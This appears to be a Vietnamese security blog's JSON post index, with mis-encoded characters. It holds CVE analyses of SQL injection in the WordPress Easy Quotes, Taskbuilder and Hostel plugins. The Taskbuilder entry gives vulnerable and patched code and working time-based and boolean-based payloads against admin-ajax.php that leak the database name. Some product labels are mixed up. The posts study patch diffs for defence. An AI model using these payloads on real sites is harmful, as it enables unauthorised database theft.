tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-26943\"\u003eCVE-2025-26943\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/easy-quotes/#description\"\u003eWordPress Easy Quotes Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.2.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v1.2.2(vul) vÃ  v1.2.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ Ä‘Æ°a trá»±c tiáº¿p dá»¯ liá»‡u tá»« ngÆ°á»i dÃ¹ng vÃ o cÃ¢u query SQL mÃ  \u003cstrong\u003ekhÃ´ng sá»­ dá»¥ng cÃ¡c biá»‡n phÃ¡p báº£o vá»‡\u003c/strong\u003e khiáº¿n lá»— há»•ng SQL Injection xáº£y ra.\u003c/p\u003e","title":"CVE-2025-26943 Analysis \u0026 POC"},{"content":"Lá»— há»•ng xáº£y ra trÃªn plugin Taskbuilder cá»§a WordPress trÆ°á»›c phiÃªn báº£n 4.0.2. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) vÃ  v4.0.2(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis á»¨ng dá»¥ng Ä‘Ã£ xá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n '...'. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° OR, AND,...) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file includes/admin/projects/get_users.php\nTrong phiÃªn báº£n v4.0.1, biáº¿n $proj_id sau khi escape Ä‘Æ°á»£c Ä‘Æ°a tháº³ng vÃ o cÃ¢u truy váº¥n mÃ  khÃ´ng cÃ³ dáº¥u nhÃ¡y Ä‘Æ¡n bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); á» báº£n v4.0.2, truy váº¥n Ä‘Ã£ Ä‘Æ°á»£c Ä‘iá»u chá»‰nh báº±ng cÃ¡ch Ä‘áº·t $proj_id trong dáº¥u nhÃ¡y Ä‘Æ¡n sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); Báº£n vÃ¡ nÃ y Ä‘áº£m báº£o ráº±ng giÃ¡ trá»‹ $proj_id sau khi escape Ä‘Æ°á»£c coi lÃ  má»™t chuá»—i literal, khÃ´ng thá»ƒ thoÃ¡t ra khá»i dáº¥u nhÃ¡y Ä‘Æ¡n Ä‘á»ƒ chÃ¨n thÃªm cÃº phÃ¡p SQL, qua Ä‘Ã³ ngÄƒn cháº·n táº¥n cÃ´ng SQL Injection.\nHow it work? File architecture:\nCáº¥u trÃºc chung cá»§a file hiá»‡n táº¡i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o ná»™i dung chÃ­nh (body) cá»§a modal ob_start(); // ... render HTML danh sÃ¡ch users $body = ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p 